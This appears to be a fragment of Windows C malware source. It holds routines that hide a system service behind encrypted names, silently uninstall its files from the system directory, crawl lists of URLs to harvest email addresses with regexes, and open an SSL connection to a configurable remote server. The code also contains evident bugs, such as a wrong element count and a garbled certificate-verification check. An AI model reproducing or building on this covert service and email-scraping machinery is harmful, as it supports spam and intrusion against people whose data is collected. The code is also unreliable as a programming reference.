	char* start;
	char result[1024] = { 0 };
	while (ReadFile(hIn, buffer, sizeof(buffer)-1, &dwRet, 0) && dwRet){
		start = buffer;
		while (start < (buffer + sizeof(buffer)))
		{
			err = regexec(&regex, start, nmatch, matchs, 0);
			if (!err)
			{

				memcpy_s(result, sizeof(result), &start[matchs[0].rm_so], matchs[0].rm_eo - matchs[0].rm_so);
				start += matchs[0].rm_eo;
				strcat_s(result, sizeof(result), "\r\n");
				WriteFile(hOut, result, strlen(result), &dwRet, 0);
				ZeroMemory(result, sizeof(result));
			}
			else break;
		}

		ZeroMemory(buffer, sizeof(buffer));
	}

	return 1;
}

DWORD DeleteService(){
	SC_HANDLE hSc;
	SC_HANDLE hScm;
	TCHAR  serName[_MAX_FNAME];
	unsigned char enc_sername[] = { SERVICE_CRYPT_NAME };

	hScm = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
	if (!hScm)
	{
		EventLogs(TEXT_CREATESERVICE_LOG4);
		return 0;
	}

	GetUnicDecrKey(enc_sername, sizeof(enc_sername), serName, sizeof(serName));
	hSc = OpenService(hScm, serName, SC_MANAGER_ALL_ACCESS);

	if (!hSc) return 0;
	DeleteService(hSc);
	return 1;
}

DWORD uninstall(){
	TCHAR dir[MAX_PATH] = { 0 };
	if (!GetSystemWow64Directory(dir, sizeof(dir)))
		GetSystemDirectory(dir, sizeof(dir));
	if (!lstrlen(dir)) return 0;
	TCHAR uuidFile[50], eventlogs[50], servFile[50];
	unsigned char enc_uuidfile[] = { UUID_CRYPT_NAME },
		enc_logfile[] = { LOG_CRYPT_NAME },
		enc_servfile[] = { SERVICE_CRYPT_EXE };
	GetUnicDecrKey(enc_uuidfile, sizeof(enc_uuidfile), uuidFile, sizeof(uuidFile));
	GetUnicDecrKey(enc_logfile, sizeof(enc_logfile), eventlogs, sizeof(eventlogs));
	GetUnicDecrKey(enc_servfile, sizeof(enc_servfile), servFile, sizeof(servFile));



	DeleteService();



	LPCTSTR files[] = { uuidFile, eventlogs, servFile };
	TCHAR path[MAX_PATH] = { 0 };
	for (int i = 0; i < sizeof(files) / sizeof(files[0]); i++)
	{
		PathCombine(path, dir, files[i]);
		DeleteFile(path);
		ZeroMemory(path, sizeof(path));
	}
	return 1;
}

DWORD IsStrExistingInFile(HANDLE hfile, char* str){
	HANDLE hfilemapping;
	DWORD filesize;
	char* addr;
	BOOL found = 1;

	filesize = GetFileSize(hfile, 0);
	if (!filesize) return 1;
	hfilemapping = CreateFileMapping(hfile, 0, PAGE_READONLY, 0, filesize + 1, 0);
	if (!hfilemapping) return 1;
	addr = (char*)MapViewOfFile(hfilemapping, FILE_MAP_READ, 0, 0, 0);
	if (!addr) return 1;

	addr[filesize] = 0;
	if (!strstr(addr, str))
		found = 0;

	UnmapViewOfFile(addr);
	CloseHandle(hfilemapping);

	return found;
}

DWORD WebRegexMatching(HANDLE hOut, LPTSTR lpUrl, const char* pattern){
	HINTERNET hNet, hNetUrl;
	DWORD dwRead, dwRet;
	regex_t regex;
	regmatch_t matchs[20];
	char error[100];
	int nmatch = sizeof(matchs) / sizeof(matchs[0]);
	int err;

	if (!PathIsURL(lpUrl)) return 0;

	if (err = regcomp(&regex, pattern, REG_EXTENDED | REG_ICASE)){
		regerror(err, &regex, error, sizeof(error));
		printf("%s", error);
		getchar();
		return 0;
	}

	hNet = InternetOpen(INTERNET_AGENT, INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0);
	if (!hNet) return 0;

	hNetUrl = InternetOpenUrl(hNet, lpUrl, 0, 0, INTERNET_FLAG_RELOAD, 0);
	if (!hNetUrl)
	{
		InternetCloseHandle(hNet);
		return 0;
	}

	TCHAR infoBuffer[50] = { 0 };
	DWORD dummy;
	DWORD bufLen;

	char buffer[1024 * 12] = { 0 }, result[1024];
	char* start;

	while ((InternetReadFile(hNetUrl, buffer, sizeof(buffer), &dwRead)) && dwRead)
	{
		dummy = 0;
		bufLen = sizeof(infoBuffer);
		if (HttpQueryInfo(hNetUrl, HTTP_QUERY_STATUS_CODE, infoBuffer, &bufLen, &dummy))
		{
			if (lstrcmp(infoBuffer, TEXT("200"))) break;

			start = buffer;
			while (start < (buffer + dwRead))
			{
				err = regexec(&regex, start, nmatch, matchs, 0);
				if (!err)
				{
					ZeroMemory(result, sizeof(result));
					memcpy_s(result, sizeof(result), &start[matchs[0].rm_so], matchs[0].rm_eo - matchs[0].rm_so);
					strcat_s(result, sizeof(result), "\r\n");
					WriteFile(hOut, result, strlen(result), &dwRet, 0);
					start += matchs[0].rm_eo;
					printf("%s", result);
				}
				else break;
			}

			ZeroMemory(buffer, sizeof(buffer));
		}

	}
	regfree(&regex);
	InternetCloseHandle(hNetUrl);
	InternetCloseHandle(hNet);
	return 1;
}

DWORD RemoveDulpicLine(HANDLE hfile){
	HANDLE hfilemapping;
	DWORD filesize;
	char* addr;
	DWORD removeinbyte = 1;
	filesize = GetFileSize(hfile, 0);
	if (!filesize) return 0;
	hfilemapping = CreateFileMapping(hfile, 0, PAGE_READWRITE, 0, filesize + 1, 0);
	if (!hfilemapping) return 0;
	addr = (char*)MapViewOfFile(hfilemapping, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);
	if (!addr) return 0;
	addr[filesize] = 0;

	char *ph, *pe, *found, *pnext;
	char line[200] = { 0 };
	DWORD len, n;
	ph = addr;

	while (*ph){
		pe = strchr(ph, '\n');
		if (!pe) break;
		pe++;
		//if (pe[1]=='\n') pe+=2;
		//else pe++;
		len = pe - ph;
		if (!(*pe)) break;
		ZeroMemory(line, sizeof(line));
		memcpy_s(line, sizeof(line), ph, len);
		
		while ((found = strstr(pe, line))){
			pnext = (found + len);
			n = strlen(pnext);
			strcpy_s(found, strlen(found), pnext);
			ZeroMemory(found + n, len);
			removeinbyte += len;
			pe = found;
		}
		ph += len;
	}
	UnmapViewOfFile(addr);
	CloseHandle(hfilemapping);
	return (~removeinbyte + 1);
}

DWORD RegMatchingByUrlFile(HANDLE ifile, HANDLE ofile, const char* pattern){
	DWORD dwret;
	char buffer[4096];
	char* sh, *se;
	char url[L_MAX_URL_LENGTH] = { 0 };
	TCHAR unicUrl[L_MAX_URL_LENGTH] = { 0 };
	while (ReadFile(ifile, buffer, sizeof(buffer), &dwret, 0) && dwret > 0)
	{
		sh = buffer;
		do{
			se = strchr(sh, '\n');
			if (!se) break;
			se++;
			ZeroMemory(url, sizeof(url));
			ZeroMemory(unicUrl, sizeof(unicUrl));
			memcpy_s(url, sizeof(url), sh, se - sh - 2);
			printf("%s\r\n",url);
			MultiByteToWideChar(CP_ACP, 0, url, -1, unicUrl, sizeof(unicUrl) / sizeof(unicUrl[0]));
			WebRegexMatching(ofile, unicUrl, pattern);
			sh = se;
		} while (sh<(buffer + dwret));
	}

	FlushFileBuffers(ofile);
	int n;
	if (n = RemoveDulpicLine(ofile)){
		SetFilePointer(ofile, n, 0, FILE_END);
		SetEndOfFile(ofile);
	}
	return 1;
}

DWORD RegClassifyToFile(HANDLE ifile, HANDLE ofile, char* pattern){

	regex_t regex;
	char errmsg[200];
	int errcode;
	if (errcode = regcomp(&regex, pattern, REG_EXTENDED | REG_ICASE)){
		regerror(errcode, &regex, errmsg, sizeof(errmsg));
		printf("%s\n", errmsg);
	}

	regmatch_t regmatch[20];
	size_t nmatch = sizeof(regmatch) / sizeof(regmatch);
	char buffer[4 * 1024];
	DWORD dwRet, dwr;
	char *head;
	char email[100];
	head = buffer;
	while (ReadFile(ifile, buffer, sizeof(buffer), &dwRet, 0) && dwRet > 0){
		while (head<(buffer + dwRet)){
			errcode = regexec(&regex, head, nmatch, regmatch, 0);
			if (errcode) break;
			ZeroMemory(email, sizeof(email));
			memcpy_s(email, sizeof(email), &head[regmatch[0].rm_so], regmatch[0].rm_eo - regmatch[0].rm_so);
			WriteFile(ofile, email, strlen(email), &dwr, 0);
			head += regmatch[0].rm_eo;
		}
	}
	regfree(&regex);
	return 0;
}

int ToBase64Crypto(const BYTE* pSrc, int nLenSrc, char* pDst, int nLenDst)
{
	DWORD nLenOut = nLenDst;
	BOOL fRet = CryptBinaryToStringA(
		(const BYTE*)pSrc, nLenSrc,
		CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
		pDst, &nLenOut
		);
	if (!fRet) nLenOut = 0;  // failed
	return(nLenOut);
}
int FromBase64Crypto(const BYTE* pSrc, int nLenSrc, char* pDst, int nLenDst)
{
	DWORD nLenOut = nLenDst;
	BOOL fRet = CryptStringToBinaryA(
		(LPCSTR)pSrc, nLenSrc,
		CRYPT_STRING_BASE64,
		(BYTE*)pDst, &nLenOut,
		NULL,        // pdwSkip (not needed)
		NULL         // pdwFlags (not needed)
		);
	if (!fRet) nLenOut = 0;  // failed
	return(nLenOut);
}

DWORD initOpenSSL_ye(SERVER_INFO* serv, BIO** pbio, SSL_CTX** pssl_ctx) {
	int ret = 0;
	SSL_load_error_strings();
	ERR_load_BIO_strings();
	OpenSSL_add_all_algorithms();
	SSL_library_init();

	BIO* bio;
	SSL_CTX* ssl_ctx;

	ssl_ctx = SSL_CTX_new(SSLv23_client_method());
	if (!ssl_ctx) {
		printf("Error: %s\n", ERR_reason_error_string(ERR_get_error()));
		return 0;
	}


	if (!SSL_CTX_load_verify_locations(ssl_ctx, 0, "demo")) {
		printf("Error: %s\n", ERR_reason_error_string(ERR_get_error()));
		return 0;
	}

	bio = BIO_new_ssl_connect(ssl_ctx);
	SSL* ssl;
	BIO_get_ssl(bio, &ssl);
	SSL_set_mode(ssl, SSL_MODE_AUTO_RETRY);
	char serverurl[100];
	sprintf_s(serverurl, sizeof(serverurl), "%s:%s", serv->server_name, serv->server_port);
	BIO_set_conn_hostname(bio, serverurl);
	if (BIO_do_connect(bio)<1) {
		printf("Error: %s\n", ERR_reason_error_string(ERR_get_error()));
		return 0;
	}

	if (!SSL_get_verify_result(ssl) != X509_V_OK) {
		printf("Error: %s\n", ERR_reason_error_string(ERR_get_error()));
		return 0;
	}
	*pbio = bio;
	*pssl_ctx = ssl_ctx;
	return 1;
}

DWORD freeOpenSSL_ye(BIO* bio, SSL_CTX* ssl_ctx) {
	if (bio)
		BIO_free_all(bio);

	if (ssl_ctx)
		SSL_CTX_free(ssl_ctx);
	return 1;
}